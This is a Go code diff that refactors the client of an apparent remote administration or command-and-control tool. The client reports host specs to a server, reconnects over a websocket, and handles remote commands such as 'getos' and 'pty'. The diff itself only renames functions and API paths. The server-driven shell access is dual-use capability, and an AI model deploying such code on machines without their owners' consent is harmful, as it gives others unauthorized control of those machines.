@@ -10,7 +10,6 @@ import (
 	"noah/client/app/utils/encode"
 	"os"
 	"os/exec"
-	"strconv"
 	"time"
 
 	"noah/client/app/gateway"
@@ -67,17 +66,17 @@ func (h *Handler) Log(v ...any) {
 	fmt.Println(v...)
 }
 
-// SendDeviceSpecs Report device information
-func (h *Handler) SendDeviceSpecs() (id uint, err error) {
-	deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
+// SendClientSpecs Report Client information
+func (h *Handler) SendClientSpecs() (id uint, err error) {
+	ClientSpecs, err := h.Services.Information.LoadClientSpecs()
 	if err != nil {
 		return 0, err
 	}
-	body, err := json.Marshal(deviceSpecs)
+	body, err := json.Marshal(ClientSpecs)
 	if err != nil {
 		return 0, err
 	}
-	res, err := h.Gateway.NewRequest(http.MethodPost, "/client/device", body)
+	res, err := h.Gateway.NewRequest(http.MethodPost, "/client", body)
 	if err != nil {
 		return 0, err
 	}
@@ -88,7 +87,7 @@ func (h *Handler) SendDeviceSpecs() (id uint, err error) {
 }
 
 func (h *Handler) ServerIsAvailable() error {
-	res, err := h.Gateway.NewRequest(http.MethodGet, "/client/health/"+strconv.FormatUint(uint64(h.ClientID), 10), nil)
+	res, err := h.Gateway.NewRequest(http.MethodGet, fmt.Sprintf("/client/%d/health", uint64(h.ClientID)), nil)
 	if err != nil {
 		return err
 	}
@@ -101,16 +100,15 @@ func (h *Handler) ServerIsAvailable() error {
 func (h *Handler) Reconnect() {
 	h.Connected = false
 	for {
-		conn, err := ws.NewConnection(h.Configuration, "/client/ws/"+fmt.Sprint(h.ClientID))
+		conn, err := ws.NewConnection(h.Configuration, fmt.Sprintf("/client/%d/ws", h.ClientID))
 		if err != nil {
-			h.Log("[!] Error CmdReconnect on WS: ", err.Error())
+			h.Log("[!] Error Reconnect on WS: ", err.Error())
 			time.Sleep(time.Second * 10)
 			continue
 		}
 
 		h.Connection = conn
 		h.Connected = true
-		h.Log("[*] CmdConnection Successfully connected")
 		break
 	}
 }
@@ -139,12 +137,12 @@ func (h *Handler) HandleCommand() {
 
 		switch request.Command {
 		case "getos":
-			deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
+			ClientSpecs, err := h.Services.Information.LoadClientSpecs()
 			if err != nil {
 				hasError = true
 				response = encode.StringToByte(err.Error())
 			} else {
-				response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
+				response = encode.StringToByte(encode.PrettyJson(ClientSpecs))
 			}
 		case "pty":
 			p := request.Parameter
